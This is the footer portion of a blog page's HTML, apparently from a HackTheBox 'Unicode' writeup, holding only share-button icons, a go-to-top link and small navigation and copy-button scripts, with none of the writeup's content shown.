95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"></path></svg></a><a target="_blank" rel="noopener noreferrer" aria-label="share HackTheBox Writeup: Unicode on telegram" href="https://telegram.me/share/url?text=HackTheBox%20Writeup%3a%20Unicode&amp;url=https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_unicode%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"></path></svg></a></div></footer></article></main><a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"></path></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>